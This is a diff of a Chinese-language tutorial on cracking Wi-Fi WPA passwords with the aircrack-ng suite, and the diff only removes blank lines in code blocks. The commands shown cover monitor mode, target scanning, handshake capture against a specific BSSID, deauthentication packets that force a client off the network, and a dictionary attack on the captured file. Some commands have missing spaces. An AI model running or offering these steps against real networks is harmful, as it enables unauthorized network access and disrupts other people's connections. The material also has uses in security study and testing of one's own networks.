@@ -62,33 +62,28 @@
 
 ```
 service  network-manager stop
-
 ```
 
 ```
 airmon-ng check kill
-
 ```
 
 **（2）. 查看本机电脑的无线网卡**
 
 ```
 ifconfig
-
 ```
 
 或者
 
 ```
 iwconfig
-
 ```
 
 找到是否有wlan0无线网卡的，如果没有无线网卡请插入usb无线网卡。 如果是插入usb网卡请
 
 ```
 ifconfig wlan0 up
-
 ```
 
 加载无线网卡
@@ -97,7 +92,6 @@ ifconfig wlan0 up
 
 ```
 airmon-ng start wlan0
-
 ```
 
 ![img](http://image.3001.net/images/20150204/14230355012283.png)
@@ -108,7 +102,6 @@ airmon-ng start wlan0
 
 ```
 airodump-ng mon0
-
 ```
 
 查看周边路由AP的信息。
@@ -123,7 +116,6 @@ airodump-ng mon0
 
 ```
 airodump-ng --ignore-negative-one -w  /tmp/test.cap-c 11 --bssid 40:16:9F:76:E7:DE mon0
-
 ```
 
 参数说明：-w 保存数据包的文件名 –c 信道 –bssid ap的mac地址 (注意test.cap会被重命名)，也可以用其他工具抓包比如：wireshark、tcpdump，抓到握手包会有提示。
@@ -136,7 +128,6 @@ airodump-ng --ignore-negative-one -w  /tmp/test.cap-c 11 --bssid 40:16:9F:76:E7:
 
 ```
 aireplay-ng -0 3 -a B8:A3:86:63:B4:06 -c 00:18:1a:10:da:c9 -x 200 mon0
-
 ```
 
 参数说明：-0 Deautenticate 冲突模式 3 发包次数 -x 发包速度
@@ -149,7 +140,6 @@ aireplay-ng -0 3 -a B8:A3:86:63:B4:06 -c 00:18:1a:10:da:c9 -x 200 mon0
 
 ```
 aircrack-ng-w pass-haoyong.txt test-03.cap
-
 ```
 
 参数解释：-w 字典路径
